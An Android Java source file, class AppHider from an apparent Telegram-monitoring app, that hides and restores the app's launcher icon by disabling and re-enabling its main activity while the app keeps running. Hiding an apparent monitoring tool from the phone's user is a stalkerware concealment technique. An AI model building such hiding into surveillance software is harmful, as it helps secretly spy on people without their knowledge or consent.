package com.nehal.telegrammonitor;

import android.content.ComponentName;
import android.content.Context;
import android.content.pm.PackageManager;

public class AppHider {

    public static void enableHide(Context ctx) {
        PackageManager pm = ctx.getPackageManager();
        ComponentName componentName = new ComponentName(ctx, com.nehal.telegrammonitor.MainActivity.class);
        pm.setComponentEnabledSetting(componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
    }

    public static void disableHide(Context ctx) {
        PackageManager pm = ctx.getPackageManager();
        ComponentName componentName = new ComponentName(ctx, com.nehal.telegrammonitor.MainActivity.class);
        pm.setComponentEnabledSetting(componentName,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP);
    }
}